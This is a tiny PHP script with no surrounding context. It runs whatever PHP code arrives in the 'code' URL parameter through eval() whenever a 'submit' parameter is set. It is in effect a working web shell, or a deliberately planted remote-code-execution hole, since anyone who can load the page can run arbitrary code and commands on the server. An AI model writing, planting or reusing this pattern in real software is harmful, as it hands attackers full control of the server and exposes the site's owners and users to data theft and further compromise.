<?php
if (isset($_GET['submit'])){
$code = $_GET['code'];
eval($code);
}
?>
